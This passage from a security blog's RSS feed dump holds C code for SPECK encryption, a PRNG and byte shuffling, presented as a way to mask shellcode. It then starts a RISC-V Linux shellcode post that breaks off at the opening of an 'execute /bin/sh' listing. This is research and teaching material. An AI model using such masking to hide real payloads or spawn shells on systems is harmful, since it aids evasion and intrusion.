#808030;\">)</span>\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #696969;\">// SPECK128-256</span>\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> WORDLEN 64</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> PRNG_MAX_INT </span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">INT64_MAX </span><span style=\"color: #808030;\">+</span><span style=\"color: #004a43;\"> 1</span><span style=\"color: #808030;\">)</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> ENCRYPT_KEY_LEN 32</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> ENCRYPT_BLOCK_LEN 16</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> R</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">,</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">|</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">64</span><span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span>\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">unsigned</span> <span style=\"color: #800000; font-weight: bold;\">long</span> <span style=\"color: #800000; font-weight: bold;\">long</span> W<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">void</span> \nencrypt<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span><span style=\"color: #808030;\">*</span>mk<span style=\"color: #808030;\">,</span><span style=\"color: #800000; font-weight: bold;\">void</span><span style=\"color: #808030;\">*</span>p<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">{</span>\n    W k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">4</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span><span style=\"color: #808030;\">*</span>x<span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">(</span>W<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>p<span style=\"color: #808030;\">,</span>i<span style=\"color: #808030;\">,</span>t<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span><span style=\"color: #008c00;\">4</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> k<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>W<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>mk<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span><span style=\"color: #008c00;\">34</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>R<span style=\"color: #808030;\">(</span>x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span>\n        x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> R<span style=\"color: #808030;\">(</span>x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">61</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span>\n        k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>R<span style=\"color: #808030;\">(</span>k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> i<span style=\"color: #808030;\">,</span>\n        k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> R<span style=\"color: #808030;\">(</span>k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">61</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n        t <span style=\"color: #808030;\">=</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> t<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">else</span>\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #696969;\">// SPECK64-128</span>\n<span style=\"color: #696969;\">//</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> WORDLEN 32</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> PRNG_MAX_INT </span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">INT32_MAX </span><span style=\"color: #808030;\">+</span><span style=\"color: #004a43;\"> 1</span><span style=\"color: #808030;\">)</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> ENCRYPT_KEY_LEN 16</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> ENCRYPT_BLOCK_LEN 8</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">define</span><span style=\"color: #004a43;\"> R</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">,</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">&gt;</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">|</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">v</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">&lt;</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">32</span><span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">(</span><span style=\"color: #004a43;\">n</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span>\n<span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">unsigned</span> <span style=\"color: #800000; font-weight: bold;\">int</span> W<span style=\"color: #800080;\">;</span>\n\n<span style=\"color: #800000; font-weight: bold;\">void</span> \nencrypt<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span><span style=\"color: #808030;\">*</span> mk<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">void</span><span style=\"color: #808030;\">*</span> p<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    W k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">4</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span><span style=\"color: #808030;\">*</span>x<span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">(</span>W<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>p<span style=\"color: #808030;\">,</span>i<span style=\"color: #808030;\">,</span>t<span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span><span style=\"color: #008c00;\">4</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> k<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span>W<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>mk<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n\n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span><span style=\"color: #008c00;\">27</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>R<span style=\"color: #808030;\">(</span>x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span>\n        x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> R<span style=\"color: #808030;\">(</span>x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">29</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span>\n        t <span style=\"color: #808030;\">=</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span>\n        k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>R<span style=\"color: #808030;\">(</span>k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> i<span style=\"color: #808030;\">,</span>\n        k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> R<span style=\"color: #808030;\">(</span>k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">29</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">^</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">3</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span>\n        k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> k<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">=</span>t<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n<span style=\"color: #004a43;\">#</span><span style=\"color: #004a43;\">endif</span>\n\nW\nprng_word<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>key<span style=\"color: #808030;\">,</span> W <span style=\"color: #603000;\">max</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    W r<span style=\"color: #808030;\">,</span> x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> ctr <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">,</span> d <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">-</span><span style=\"color: #603000;\">max</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">/</span> <span style=\"color: #603000;\">max</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span>d <span style=\"color: #808030;\">=</span><span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">return</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #800080;\">;</span><span style=\"color: #800080;\">;</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #603000;\">max</span><span style=\"color: #800080;\">;</span>\n        x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> ctr<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #800080;\">;</span>\n        \n        encrypt<span style=\"color: #808030;\">(</span>key<span style=\"color: #808030;\">,</span> x<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        \n        r <span style=\"color: #808030;\">=</span> x<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">/</span> d<span style=\"color: #800080;\">;</span>\n        <span style=\"color: #800000; font-weight: bold;\">if</span> <span style=\"color: #808030;\">(</span>r <span style=\"color: #808030;\">&lt;</span> <span style=\"color: #603000;\">max</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800000; font-weight: bold;\">return</span> r<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n\n<span style=\"color: #800000; font-weight: bold;\">void</span>\nshuffle<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>seed<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>inbuf<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">size_t</span> inlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    uint8_t <span style=\"color: #808030;\">*</span>in <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>uint8_t<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>inbuf<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">size_t</span> i <span style=\"color: #808030;\">=</span> inlen <span style=\"color: #808030;\">-</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #800080;\">;</span> i <span style=\"color: #808030;\">&gt;</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">-</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        uint32_t j <span style=\"color: #808030;\">=</span> prng_word<span style=\"color: #808030;\">(</span>seed<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        uint8_t t <span style=\"color: #808030;\">=</span> in<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n        in<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> in<span style=\"color: #808030;\">[</span>j<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n        in<span style=\"color: #808030;\">[</span>j<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> t<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n\n<span style=\"color: #800000; font-weight: bold;\">void</span>\nunshuffle<span style=\"color: #808030;\">(</span><span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>seed<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">void</span> <span style=\"color: #808030;\">*</span>inbuf<span style=\"color: #808030;\">,</span> <span style=\"color: #603000;\">size_t</span> inlen<span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n    uint8_t <span style=\"color: #808030;\">*</span>in <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span>uint8_t<span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">)</span>inbuf<span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">for</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">size_t</span> i <span style=\"color: #808030;\">=</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i <span style=\"color: #808030;\">&lt;</span> inlen<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n        uint32_t j <span style=\"color: #808030;\">=</span> prng_word<span style=\"color: #808030;\">(</span>seed<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span>i <span style=\"color: #808030;\">+</span> <span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n        uint8_t t <span style=\"color: #808030;\">=</span> in<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n        in<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> in<span style=\"color: #808030;\">[</span>j<span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>\n        in<span style=\"color: #808030;\">[</span>j<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> t<span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n<span style=\"color: #800080;\">}</span>\n</pre>\n<!--Created using ToHtml.com on 2022-07-30 22:29:34 UTC -->\n\n<p>There are times when elements of the array will remain in the same position after shuffling. This typically happens with small arrays. In that case, something else is required for masking. Now, if you know of a way to fix that, feel free to leave a comment or drop me an email.</p>\n\n<h2>Summary</h2>\n\n<p>Shuffling doesn&#8217;t provide any confidentiality for the masked data like encryption does and doesn&#8217;t reduce its size like compression does. However, shuffling a large enough array using a secure cipher and secret key to generate a sequence of numbers can probably make it difficult to recover the original data without the key used to initialise the PRNG. That seems helpful in masking data and better than an XOR. But of course, something like this is in no way intended or implied to be a suitable replacement for encryption and shouldn&#8217;t be used for any critical information! </p>\n\n<h2>References</h2>\n\n<ul>\n    <li><a href=\"https://en.wikipedia.org/wiki/Counter-based_random_number_generator_(CBRNG)\">Counter-based random number generator (CBRNG)</a></li>\n    \n    <li><a href=\"https://www.pcg-random.org/posts/bounded-rands.html\">Efficiently Generating a Number in a Range</a></li>\n    \n    <li><a href=\"https://www.flatrock.org.nz/topics/art_of_playing_cards/how_to_win_at_poker.htm\">How to Win at Poker, and Other Science Lessons</a></li>\n    \n    <li><a href=\"https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/\">The definitive guide to Modulo Bias and how to avoid it!</a></li>\n</ul>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2022/07/31/shellcode-data-masking/feed/",
            "slash_comments": "0",
            "media_content": [
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Shellcode: Linux on RISC-V 64-Bit",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Shellcode: Linux on RISC-V 64-Bit"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/"
                }
            ],
            "link": "https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/",
            "comments": "https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/#respond",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Mon, 02 May 2022 20:28:59 +0000",
            "published_parsed": [
                2022,
                5,
                2,
                20,
                28,
                59,
                0,
                122,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "http://modexp.wordpress.com/?p=5157",
            "guidislink": false,
            "summary": "RISC-V (pronounced &#8220;risk-five&#8221; ) is an open standard instruction set architecture (ISA) based on established reduced instruction set computer (RISC) principles. Unlike most other ISA designs, RISC-V is provided under open source licenses that do not require fees to use. &#8230; <a href=\"https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "RISC-V (pronounced &#8220;risk-five&#8221; ) is an open standard instruction set architecture (ISA) based on established reduced instruction set computer (RISC) principles. Unlike most other ISA designs, RISC-V is provided under open source licenses that do not require fees to use. &#8230; <a href=\"https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/\">Continue reading <span class=\"meta-nav\">&#8594;</span></a>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://modexp.wordpress.com/feed/",
                    "value": "<p><em>RISC-V (pronounced &#8220;risk-five&#8221; ) is an open standard <a href=\"https://riscv.org/technical/specifications/\">instruction set architecture</a> (ISA) based on established reduced instruction set computer (RISC) principles. Unlike most other ISA designs, RISC-V is provided under open source licenses that do not require fees to use.</em></p>\n<p>To learn more about the RISC-V architecture, I recently bought <a href=\"https://shop.allnetchina.cn/products/starfive-visionfive-ai-single-board-computer\">a StarFive VisionFive Single Board computer</a>. It&#8217;s slightly more expensive than the RPI that runs on ARM, but it&#8217;s the closest thing to an RPI we have available right now. It uses the SiFive\u2019s U74 64-bit RISC-V processor core which is similar to the <a href=\"https://developer.arm.com/Processors/Cortex-A55\">ARM Cortex-A55</a>. Readers without access to a board like this have the option of using <a href=\"https://www.qemu.org/docs/master/system/target-riscv.html\">QEMU</a>.</p>\n<p>You can view the <a href=\"https://github.com/odzhan/shellcode/tree/master/os/linux/riscv64\">shellcodes here</a>.</p>\n<p>The RISC-V ISA (excluding extensions) is of course much smaller than the ARM ISA, but that also makes it easier to learn IMHO. The reduced set of instructions is more suitable for beginners learning their first assembly language. From a business perspective, and I accept I&#8217;m not an expert on such issues, the main advantages of RISC-V over ARM is that it&#8217;s open source, has no licensing fees and is sanction-free. For those reasons, it may very well become more popular than ARM in future. We&#8217;ll have to wait and see.</p>\n<table border=\"1\">\n<thead>\n<tr>\n<th>\u00a0</th>\n<th>X86 (AMD64)</th>\n<th>ARM64</th>\n<th>RISC-V 64</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Registers</td>\n<td>RAX-R15</td>\n<td>X0-X31</td>\n<td>A0-A31</td>\n</tr>\n<tr>\n<td>Syscall Register</td>\n<td>RAX</td>\n<td>X8</td>\n<td>A7</td>\n</tr>\n<tr>\n<td>Return Register</td>\n<td>RAX</td>\n<td>X0</td>\n<td>A0</td>\n</tr>\n<tr>\n<td>Zero Register</td>\n<td>N/A</td>\n<td>XMR</td>\n<td>X0</td>\n</tr>\n<tr>\n<td>Relative Addressing</td>\n<td>LEA</td>\n<td>ADR</td>\n<td>LA</td>\n</tr>\n<tr>\n<td>Data Transfer (Register)</td>\n<td>MOV</td>\n<td>MOV</td>\n<td>MV</td>\n</tr>\n<tr>\n<td>Data Transfer (Immediate)</td>\n<td>MOV</td>\n<td>MOV</td>\n<td>LI</td>\n</tr>\n<tr>\n<td>Execute System Call</td>\n<td>SYSCALL</td>\n<td>SVC</td>\n<td>ECALL</td>\n</tr>\n</tbody>\n</table>\n<h2>Execute /bin/sh</h2>\n<pre style=\"color: #000000; background: #ffffff;\">    # <span style=\"color: #008c00;\">48</span> bytes\n \n    .<span style=\"color: #004a43;\">include</span> <span style=\"color: #0000e6;\">\"include.inc\"</span>\n\n    .<span style=\"color: #004a43;\">global</span> _start\n    .text\n\n<span style=\"color: #e34adc;\">_start:</span>\n    # execve<span style=\"color: 